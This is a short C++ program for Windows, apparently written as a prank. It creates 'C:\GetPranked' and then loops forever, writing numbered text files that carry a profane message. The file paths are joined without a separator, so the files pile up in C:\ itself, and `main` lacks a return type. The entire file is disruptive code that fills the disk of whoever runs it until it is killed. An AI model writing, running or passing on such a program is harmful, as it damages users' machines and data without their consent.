#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>

main()
{
	long i = 0;
	const char *path = "C:\\GetPranked";
	std::string content = "Get fucked gibba";
	_mkdir(path);
	while (true)
	{
		i++;
		std::ofstream file;
		file.open(path + std::to_string(i) + ".txt", std::ios_base::out);
		file << content;
		file.close();
		std::cout << "File created;" + std::to_string(i) + "\r\n";
	}
}